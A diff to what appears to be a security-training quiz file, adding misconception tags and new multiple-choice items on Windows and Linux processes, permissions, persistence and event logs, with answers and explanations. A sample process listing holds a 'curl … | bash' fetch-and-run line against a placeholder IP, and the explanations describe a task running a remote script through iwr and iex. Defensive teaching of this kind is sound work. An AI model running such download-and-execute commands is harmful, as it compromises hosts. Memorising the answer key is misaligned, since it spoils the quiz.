@@ -31,6 +31,9 @@ export const HOST_ITEMS = [
       'A network connection between two computers',
     ],
     answer: 'A running instance of a program, with its own memory and a process ID (PID)',
+    misconceptions: {
+      "An executable file stored on disk": 'proc-program-vs-process',
+    },
     explanation:
       'A program is the file on disk (for example `notepad.exe`). A process is that program loaded into memory and running, tracked by the operating system with a unique PID. One program can have many processes at once. Accounts own processes and processes can open network connections, but neither of those is a process itself.',
   },
@@ -62,6 +65,10 @@ export const HOST_ITEMS = [
     prompt: 'On Windows, which process is the legitimate parent of service host processes such as svchost.exe?',
     choices: ['services.exe', 'explorer.exe', 'wininit.exe', 'lsass.exe'],
     answer: 'services.exe',
+    misconceptions: {
+      "explorer.exe": 'proc-svchost-parent',
+      "wininit.exe": 'proc-svchost-parent',
+    },
     explanation:
       'svchost.exe instances are started by services.exe (the Service Control Manager). wininit.exe is the parent of services.exe and lsass.exe, one level higher. An svchost.exe whose parent is explorer.exe (the user\'s desktop shell) or anything else is a classic sign of malware pretending to be a system process.',
   },
@@ -83,6 +90,10 @@ export const HOST_ITEMS = [
       'Its parent process is explorer.exe',
       'The file name is actually "svch0st.exe" (a zero instead of the letter o)',
     ],
+    misconceptions: {
+      "Its parent process is explorer.exe": 'proc-svchost-parent',
+      "The file name is actually \"svch0st.exe\" (a zero instead of the letter o)": 'fs-trust-name-location',
+    },
     explanation:
       'The real svchost.exe lives in C:\\Windows\\System32 and is started by services.exe, so a wrong folder, a wrong parent, or a look-alike name are all warning signs. Seeing many svchost.exe processes is completely normal: Windows runs a separate one for each group of services.',
   },
@@ -104,6 +115,10 @@ export const HOST_ITEMS = [
     ],
     answer:
       'Word spawned a command shell that launched hidden, encoded PowerShell — a classic malicious macro pattern',
+    misconceptions: {
+      "PowerShell should never run on a Windows computer": 'proc-powershell-always-bad',
+      "cmd.exe is supposed to be the parent of WINWORD.EXE, not the child": 'proc-pid-ppid',
+    },
     explanation:
       'Office apps rarely need to start cmd.exe or PowerShell. Add `-w hidden` (no window) and `-enc` (Base64-encoded command) and this is the textbook pattern of a malicious macro in a phishing document. PowerShell itself is a legitimate admin tool, and PID numbers are just counters with no meaning about safety.',
   },
@@ -154,6 +169,10 @@ www-data  3190  2211  sh -c curl -s http://203.0.113.50/x.sh | bash`,
     prompt: 'A Linux file shows the permissions -rwxr-x---. What can members of the file\'s group do?',
     choices: ['Read and execute', 'Read, write and execute', 'Nothing', 'Read only'],
     answer: 'Read and execute',
+    misconceptions: {
+      "Read, write and execute": 'perm-rwx-triplets',
+      "Read only": 'perm-rwx-triplets',
+    },
     explanation:
       'After the first character (file type), permissions come in three sets of three: owner `rwx`, group `r-x`, others `---`. So the group can read and execute but not write, and everyone else gets nothing.',
   },
@@ -174,6 +193,11 @@ www-data  3190  2211  sh -c curl -s http://203.0.113.50/x.sh | bash`,
     type: 'text',
     prompt: 'What is the octal (numeric) form of the permissions rwxr-xr-x? (Type the three digits.)',
     accept: ['755', '0755'],
+    misconceptions: {
+      "577": 'perm-rwx-triplets',
+      "757": 'perm-rwx-triplets',
+      "775": 'perm-rwx-triplets',
+    },
     explanation:
       'Each set is added up with r=4, w=2, x=1. Owner rwx = 4+2+1 = 7, group r-x = 4+1 = 5, others r-x = 5. So `chmod 755` gives rwxr-xr-x, typical for programs and directories.',
   },
@@ -201,6 +225,9 @@ www-data  3190  2211  sh -c curl -s http://203.0.113.50/x.sh | bash`,
       'Guarantees that malware cannot run',
     ],
     answer: 'Runs administrators with a standard-user token until they approve an elevation prompt',
+    misconceptions: {
+      "Guarantees that malware cannot run": 'perm-uac-guarantee',
+    },
     explanation:
       'With UAC, even an admin\'s programs start with limited rights; the full admin token is only used after the "Do you want to allow this app to make changes?" prompt. It reduces damage from accidental or silent execution, but it is not encryption (that is BitLocker/EFS) and it is not a guarantee against malware — attackers have UAC bypass techniques.',
   },
@@ -220,6 +247,9 @@ backup2:x:0:0::/home/backup2:/bin/bash`,
       'root uses /bin/bash as its shell',
     ],
     answer: 'backup2 has UID 0, giving it root-level privileges',
+    misconceptions: {
+      "The \"x\" means passwords are stored in plain text": 'fs-passwd-hashes',
+    },
     explanation:
       'The third field is the UID. backup2 has UID 0, so it is effectively a second root account — a common backdoor. The `x` means the password hash is stored in /etc/shadow (not plain text), regular users normally start at UID 1000, and bash is a normal shell for root.',
   },
@@ -247,6 +277,10 @@ backup2:x:0:0::/home/backup2:/bin/bash`,
       'The file has a valid digital signature',
     ],
     answer: 'SUID: the program runs with the file owner\'s (root\'s) privileges no matter who starts it',
+    misconceptions: {
+      "The sticky bit: only the owner can delete it": 'perm-suid-sticky',
+      "The file has a valid digital signature": 'perm-suid-sticky',
+    },
     explanation:
       'An `s` in the owner execute position is the SUID bit. Legit examples include `passwd`, but an unexpected SUID-root binary (like a copy of bash) is a classic privilege-escalation backdoor. Sockets show as `s` in the first (file type) position, and the sticky bit shows as `t` in the others position.',
   },
@@ -308,6 +342,9 @@ backup2:x:0:0::/home/backup2:/bin/bash`,
     prompt: 'On Linux, which file stores the password hashes?',
     choices: ['/etc/shadow', '/etc/passwd', '/var/log/auth.log', '/root/.bashrc'],
     answer: '/etc/shadow',
+    misconceptions: {
+      "/etc/passwd": 'fs-passwd-hashes',
+    },
     explanation:
       '/etc/shadow holds the hashes and is readable only by root. /etc/passwd lists accounts (readable by everyone, which is why hashes moved out of it), auth.log records logins, and .bashrc is a shell startup script.',
   },
@@ -335,6 +372,9 @@ backup2:x:0:0::/home/backup2:/bin/bash`,
       'This folder is only used for Office templates',
     ],
     answer: 'Anything in a user\'s Startup folder runs automatically every time that user logs on',
+    misconceptions: {
+      "It is the Windows Update folder, so the file is trusted": 'fs-trust-name-location',
+    },
     explanation:
       'The Startup folder is a simple persistence spot: a user can write to it without admin rights, and its contents run at every logon. Windows Update does not live here, nothing is auto-quarantined, and Office templates are stored elsewhere.',
   },
@@ -352,6 +392,12 @@ backup2:x:0:0::/home/backup2:/bin/bash`,
       'C:\\Program Files',
     ],
     answer: ['C:\\Users\\<user>\\AppData\\Local\\Temp', 'C:\\Users\\Public', 'C:\\ProgramData'],
+    misconceptions: {
+      "C:\\Windows\\System32": 'fs-user-writable',
+      "C:\\Program Files": 'fs-user-writable',
+      "C:\\ProgramData": 'fs-user-writable',
+      "C:\\Users\\Public": 'fs-user-writable',
+    },
     explanation:
       'A user\'s Temp folder, C:\\Users\\Public and (by default) C:\\ProgramData all allow ordinary users to create files, so malware dropped without admin rights lands there. System32 and Program Files require administrator rights to write to.',
   },
@@ -370,6 +416,11 @@ backup2:x:0:0::/home/backup2:/bin/bash`,
       'Moving from one compromised host to another',
     ],
     answer: 'Techniques that keep the attacker\'s access working across reboots, logoffs or password changes',
+    misconceptions: {
+      "Repeatedly guessing passwords until one works": 'pers-definition',
+      "Copying data out of the network": 'pers-definition',
+      "Moving from one compromised host to another": 'pers-definition',
+    },
     explanation:
       'Persistence is about staying in: services, scheduled tasks, Run keys, cron jobs, SSH keys and so on. Password guessing is brute force, copying data out is exfiltration, and hopping between hosts is lateral movement — different stages of an attack.',
   },
@@ -381,6 +432,10 @@ backup2:x:0:0::/home/backup2:/bin/bash`,
     prompt: 'On a Linux system using systemd, where could an attacker drop a unit file to create a service that starts at boot?',
     choices: ['/etc/systemd/system/', '/var/log/', '/proc/', '/dev/null'],
     answer: '/etc/systemd/system/',
+    misconceptions: {
+      "/var/log/": 'pers-linux-locations',
+      "/proc/": 'pers-linux-locations',
+    },
     explanation:
       'Admin-created and override unit files live in /etc/systemd/system/ (users can also add their own in ~/.config/systemd/user/). /var/log holds logs, /proc is a virtual view of running processes, and /dev/null discards anything written to it.',
   },
@@ -434,6 +489,9 @@ Service Account:    LocalSystem`,
       'Service names must begin with "Microsoft"',
     ],
     answer: 'An auto-start service running as LocalSystem from a user-writable folder (C:\\Users\\Public)',
+    misconceptions: {
+      "Event ID 7045 always means malware": 'pers-new-service-malware',
+    },
     explanation:
       'Event 7045 records every new service; installers generate it legitimately, so the event alone is not proof. What stands out is the combination: a vague "update" name, a binary in C:\\Users\\Public, auto start, and the most powerful account (LocalSystem). Real services live under Program Files or System32.',
   },
@@ -454,6 +512,9 @@ Service Account:    LocalSystem`,
     ],
     answer:
       'Creates a task that runs every 5 minutes as SYSTEM, downloading and executing a remote PowerShell script, disguised as a Google update task',
+    misconceptions: {
+      "Updates Google Chrome every 5 minutes": 'fs-trust-name-location',
+    },
     explanation:
       '`/create /sc minute /mo 5` = new task every 5 minutes; `/ru SYSTEM` = run as SYSTEM; `iwr` (Invoke-WebRequest) downloads a script and `iex` (Invoke-Expression) runs it. The task name imitates real Google updater tasks to blend in. Nothing here deletes a task or runs only at boot.',
   },
@@ -471,6 +532,10 @@ Service Account:    LocalSystem`,
       '/var/log/wtmp',
     ],
     answer: ['~/.bashrc', '~/.ssh/authorized_keys', '/etc/crontab'],
+    misconceptions: {
+      "/proc/cpuinfo": 'pers-linux-locations',
+      "/var/log/wtmp": 'pers-linux-locations',
+    },
     explanation:
       '.bashrc runs every time the user opens an interactive shell, an attacker\'s public key in authorized_keys grants password-less SSH access, and /etc/crontab runs scheduled commands. /proc/cpuinfo is a read-only virtual file describing the CPU, and /var/log/wtmp is a login record (evidence, not persistence).',
   },
@@ -489,6 +554,9 @@ Service Account:    LocalSystem`,
       'A new process has been created',
     ],
     answer: 'An account failed to log on',
+    misconceptions: {
+      "An account was successfully logged on": 'log-success-vs-failure',
+    },
     explanation:
       '4625 = failed logon. Lots of them in a short time from one source suggests password guessing. For comparison: 4624 = successful logon, 4720 = user account created, 4688 = new process created.',
   },
@@ -499,6 +567,9 @@ Service Account:    LocalSystem`,
     type: 'text',
     prompt: 'Which Windows Security Event ID records a successful logon?',
     accept: ['4624'],
+    misconceptions: {
+      "4625": 'log-success-vs-failure',
+    },
     explanation:
       '4624 = "An account was successfully logged on." Its Logon Type field tells you how: 2 = at the keyboard, 3 = over the network (e.g. file share), 10 = Remote Desktop. Its partner 4625 is the failed logon.',
   },
@@ -559,6 +630,10 @@ Service Account:    LocalSystem`,
       'A failed attack — no logon succeeded',
     ],
     answer: 'A password-guessing (brute-force) attack over Remote Desktop that appears to have succeeded',
+    misconceptions: {
+      "A failed attack — no logon succeeded": 'log-success-vs-failure',
+      "A user who forgot their password, which is harmless": 'log-failures-harmless',
+    },
     explanation:
       'Hundreds of 4625 failures from one external IP followed by a 4624 success from the same IP is brute force that worked. Logon Type 10 = RemoteInteractive, i.e. RDP. This should be escalated immediately: disable/reset the account and investigate what the attacker did after 08:17.',
   },
@@ -578,6 +653,9 @@ Sep 25 03:12:49 web01 sshd[2235]: Failed password for root from 198.51.100.9 por
       'The server is rebooting',
     ],
     answer: 'One IP is brute-forcing SSH, trying several usernames',
+    misconceptions: {
+      "root successfully logged in over SSH": 'log-success-vs-failure',
+    },
     explanation:
       'Rapid "Failed password" lines from the same source, trying common names (oracle, test, root), is automated SSH guessing. "invalid user" means that username does not exist on the box. A successful login would say "Accepted password" or "Accepted publickey"; sudo activity shows up as `sudo:` lines.',
   },
@@ -615,7 +693,217 @@ Sep 25 03:12:49 web01 sshd[2235]: Failed password for root from 198.51.100.9 por
       'The server ran low on disk space',
     ],
     answer: 'The Security audit log was cleared, a common way for attackers to hide their tracks',
+    misconceptions: {
+      "A scheduled backup finished successfully": 'log-clear-routine',
+    },
     explanation:
       '1102 = "The audit log was cleared." Legitimate clearing is rare and should be tied to a change ticket; at 2 AM with no ticket it strongly suggests anti-forensics. Check who cleared it (the event records the account) and pull logs from your SIEM, which still has copies.',
+  },
+
+  // ===================== Misconception follow-ups (host) =====================
+  {
+    id: 'hp-09',
+    skill: 'host-processes',
+    difficulty: 1,
+    type: 'mc',
+    prompt: 'Task Manager shows five chrome.exe entries, but there is only one chrome.exe file on disk. Why?',
+    choices: [
+      'Each entry is a separate process started from the same program file',
+      'Chrome has copied its program file to disk five times',
+      'Task Manager lists every file in the Chrome folder',
+      'Four of the five must be malware using the same name',
+    ],
+    answer: 'Each entry is a separate process started from the same program file',
+    misconceptions: {
+      'Chrome has copied its program file to disk five times': 'proc-program-vs-process',
+      'Task Manager lists every file in the Chrome folder': 'proc-program-vs-process',
+    },
+    explanation:
+      'One program file can be started many times, and each running copy is its own process with its own PID and memory. Browsers deliberately run tabs and helpers as separate processes. Task Manager lists processes, not files. Duplicate names alone are not suspicious; the path, parent and signature are what you check.',
+  },
+  {
+    id: 'hp-10',
+    skill: 'host-processes',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'Which process started `python3 /tmp/.x/m.py`?',
+    snippet: 'UID    PID   PPID  CMD\nroot     1      0  /sbin/init\nroot   812      1  /usr/sbin/sshd -D\nroot  4410    812  sshd: dev [priv]\ndev   4431   4410  sshd: dev@pts/0\ndev   4432   4431  -bash\ndev   4519   4432  python3 /tmp/.x/m.py',
+    choices: [
+      '-bash (PID 4432): the shell of user dev\'s SSH session',
+      'Process 4519',
+      '/usr/sbin/sshd -D (PID 812), because it is listed first',
+      '/sbin/init, because every process has PPID 1',
+    ],
+    answer: '-bash (PID 4432): the shell of user dev\'s SSH session',
+    misconceptions: {
+      'Process 4519': 'proc-pid-ppid',
+      '/usr/sbin/sshd -D (PID 812), because it is listed first': 'proc-pid-ppid',
+      '/sbin/init, because every process has PPID 1': 'proc-pid-ppid',
+    },
+    explanation:
+      'The python3 line has PID 4519 (its own ID) and PPID 4432 (its parent). PID 4432 is `-bash`, the login shell of dev\'s SSH session (sshd → sshd → bash). So the user dev ran a script from a hidden folder in /tmp, which is worth a look. sshd -D is a more distant ancestor, not the parent.',
+  },
+  {
+    id: 'hp-11',
+    skill: 'host-processes',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'A new analyst wants to escalate this EDR event as malware because PowerShell ran as SYSTEM. What is the best assessment?',
+    snippet: 'Parent:  C:\\Windows\\CCM\\CcmExec.exe   (Configuration Manager agent, signed by Microsoft)\nProcess: powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\\Windows\\CCM\\SystemTemp\\InventoryCheck.ps1"\nUser:    NT AUTHORITY\\SYSTEM\nSeen:    Tue 10:02, same command on 1,240 managed laptops',
+    choices: [
+      'Most likely legitimate management activity: a signed agent parent, a script in the agent\'s own folder, the same job fleet-wide. Check the script, but PowerShell itself is not the red flag',
+      'Malicious: PowerShell running as SYSTEM is always an attack',
+      'Malicious: -ExecutionPolicy Bypass is only ever used by malware',
+      'Impossible to judge, so every PowerShell event must be escalated',
+    ],
+    answer:
+      'Most likely legitimate management activity: a signed agent parent, a script in the agent\'s own folder, the same job fleet-wide. Check the script, but PowerShell itself is not the red flag',
+    misconceptions: {
+      'Malicious: PowerShell running as SYSTEM is always an attack': 'proc-powershell-always-bad',
+      'Malicious: -ExecutionPolicy Bypass is only ever used by malware': 'proc-powershell-always-bad',
+      'Impossible to judge, so every PowerShell event must be escalated': 'proc-powershell-always-bad',
+    },
+    explanation:
+      'Management tools such as Configuration Manager run PowerShell as SYSTEM, often with -ExecutionPolicy Bypass, on every machine they manage. The context here is consistent: a signed agent parent, a script inside the agent folder, and identical activity across the fleet. Compare that with Word spawning hidden, encoded PowerShell on one laptop. Judge the parent, command line and spread, not the name.',
+  },
+  {
+    id: 'hu-09',
+    skill: 'host-users',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'A listing shows `drwxrwxrwt  root root  /tmp`. What does the final "t" do?',
+    choices: [
+      'Sticky bit: anyone can create files, but only a file\'s owner (or root) can delete or rename it',
+      'SUID: programs stored in /tmp run as root',
+      'Only root can write to the directory',
+      'The directory is wiped every minute',
+    ],
+    answer: 'Sticky bit: anyone can create files, but only a file\'s owner (or root) can delete or rename it',
+    misconceptions: {
+      'SUID: programs stored in /tmp run as root': 'perm-suid-sticky',
+    },
+    explanation:
+      'A "t" in the others-execute position is the sticky bit. /tmp is world-writable (rwxrwxrwx), and the sticky bit stops users from deleting or renaming each other\'s files there. SUID is different: an "s" in the owner-execute position of a program file, which makes it run with the owner\'s privileges.',
+  },
+  {
+    id: 'hu-10',
+    skill: 'host-users',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'A user who is a local administrator clicks "Yes" on a UAC prompt for invoice_viewer.exe, which came from an email. What protection did UAC give?',
+    choices: [
+      'Very little: once the user approved it, the program runs with full admin rights. UAC is a speed bump, not a security boundary',
+      'UAC scanned the file and would have blocked it if it were malware',
+      'Programs approved through UAC run in a sandbox, so the system is safe',
+      'UAC encrypted the program before running it',
+    ],
+    answer:
+      'Very little: once the user approved it, the program runs with full admin rights. UAC is a speed bump, not a security boundary',
+    misconceptions: {
+      'UAC scanned the file and would have blocked it if it were malware': 'perm-uac-guarantee',
+      'Programs approved through UAC run in a sandbox, so the system is safe': 'perm-uac-guarantee',
+    },
+    explanation:
+      'UAC only asks for approval before a program gets the administrator token. It does not scan files or sandbox anything. Once the user clicks Yes, the program has full admin rights. This is why least privilege (users without local admin), EDR and email filtering matter.',
+  },
+  {
+    id: 'hf-09',
+    skill: 'host-filesystem',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'Malware running as a standard (non-admin) user wants to save its payload. Which of these locations can it NOT write to by default?',
+    choices: ['C:\\Windows\\System32', 'C:\\Users\\<user>\\AppData\\Roaming', 'C:\\Users\\Public', 'C:\\ProgramData'],
+    answer: 'C:\\Windows\\System32',
+    misconceptions: {
+      'C:\\Users\\<user>\\AppData\\Roaming': 'fs-user-writable',
+      'C:\\Users\\Public': 'fs-user-writable',
+      'C:\\ProgramData': 'fs-user-writable',
+    },
+    explanation:
+      'System32 (and Program Files) need administrator rights to modify. A user\'s own profile (AppData, Temp, Downloads), C:\\Users\\Public and, by default, C:\\ProgramData are writable without admin rights. That is exactly why user-level malware and droppers show up in those folders.',
+  },
+  {
+    id: 'hs-08',
+    skill: 'host-persistence',
+    difficulty: 1,
+    type: 'mc',
+    prompt: 'An attacker adds their own public key to ~/.ssh/authorized_keys on a server they compromised. Which attack stage (tactic) is this?',
+    choices: [
+      'Persistence: the key keeps working even if the password is changed',
+      'Credential access: brute-forcing the password',
+      'Exfiltration: copying data out',
+      'Reconnaissance: scanning for open ports',
+    ],
+    answer: 'Persistence: the key keeps working even if the password is changed',
+    misconceptions: {
+      'Credential access: brute-forcing the password': 'pers-definition',
+      'Exfiltration: copying data out': 'pers-definition',
+    },
+    explanation:
+      'A key in authorized_keys lets the attacker log in again later, even after a reboot or a password reset, so it is persistence (MITRE ATT&CK T1098.004). Brute force is credential access, copying data out is exfiltration, and scanning is reconnaissance or discovery.',
+  },
+  {
+    id: 'hs-09',
+    skill: 'host-persistence',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'IT deployed the Contoso backup agent to all servers last night under an approved change. This event appears on one of them. What is the best assessment?',
+    snippet: 'Log: System   Event ID: 7045   Source: Service Control Manager\nA service was installed in the system.\nService Name:       Contoso Backup Agent\nService File Name:  "C:\\Program Files\\Contoso\\Backup\\cbagent.exe"\nService Type:       user mode service\nService Start Type: auto start\nService Account:    LocalSystem\nSigner:             Contoso Ltd (valid signature)',
+    choices: [
+      'Expected: a signed vendor service installed in Program Files during an approved change. Note it and move on',
+      'Malicious: every 7045 event means malware',
+      'Malicious: legitimate services never run as LocalSystem',
+      'Cannot be judged: service events carry no useful detail',
+    ],
+    answer: 'Expected: a signed vendor service installed in Program Files during an approved change. Note it and move on',
+    misconceptions: {
+      'Malicious: every 7045 event means malware': 'pers-new-service-malware',
+      'Malicious: legitimate services never run as LocalSystem': 'pers-new-service-malware',
+    },
+    explanation:
+      'Every installer that adds a service triggers 7045, and many legitimate services run as LocalSystem. What makes a service suspicious is the detail: a binary in a user-writable folder, a random or look-alike name, no valid signature, or no matching change. Here everything lines up with the planned deployment.',
+  },
+  {
+    id: 'hl-10',
+    skill: 'host-logs',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'You see this sequence of Security events on a file server at night. What is the best reading?',
+    snippet: '02:11:40  4720  A user account was created             Target: svc_update   Subject: jsmith\n02:12:05  4732  A member was added to a local group    Group: Administrators  Member: svc_update\n02:14:57  1102  The audit log was cleared              Subject: jsmith',
+    choices: [
+      'Likely malicious: a new account was given admin rights, then the Security log was cleared to hide it',
+      'Routine maintenance: clearing the audit log stops the disk filling up',
+      'Nothing to see: 1102 just means the log rolled over normally',
+      'A failed attack: clearing the log undid the account changes',
+    ],
+    answer: 'Likely malicious: a new account was given admin rights, then the Security log was cleared to hide it',
+    misconceptions: {
+      'Routine maintenance: clearing the audit log stops the disk filling up': 'log-clear-routine',
+      'Nothing to see: 1102 just means the log rolled over normally': 'log-clear-routine',
+    },
+    explanation:
+      '4720 (account created) and 4732 (added to the local Administrators group) followed minutes later by 1102 (Security log cleared) is a classic "create a backdoor admin and cover tracks" pattern. Logs roll over by overwriting old events, not by logging 1102. Clearing the log does not undo anything. Escalate, and check whether jsmith\'s account itself is compromised.',
+  },
+  {
+    id: 'hl-11',
+    skill: 'host-logs',
+    difficulty: 2,
+    type: 'mc',
+    prompt: 'A Windows server shows the activity below. How should it be classified?',
+    snippet: 'Event 4625  An account failed to log on   (212 events in 6 minutes)\nSource Network Address: 203.0.113.77\nLogon Type: 3\nAccount names tried: administrator, admin, test, backup, scanner, j.lee ... (41 different names)\nFailure Reason: Unknown user name or bad password',
+    choices: [
+      'Automated password guessing (spraying) from an external IP across many accounts',
+      'A user who forgot their password; no action needed',
+      'Normal: Windows retries failed logons automatically',
+      'A successful compromise of 41 accounts',
+    ],
+    answer: 'Automated password guessing (spraying) from an external IP across many accounts',
+    misconceptions: {
+      'A user who forgot their password; no action needed': 'log-failures-harmless',
+      'Normal: Windows retries failed logons automatically': 'log-failures-harmless',
+      'A successful compromise of 41 accounts': 'log-success-vs-failure',
+    },
+    explanation:
+      'A forgetful user fails a few times on one account from their own machine. 212 failures in 6 minutes from one external address across 41 usernames is automated guessing. These are 4625 (failed) events, so nothing here shows a success. Next steps: check for any 4624 from 203.0.113.77, block the source, and ask why this server accepts logons from the internet.',
   },
 ];
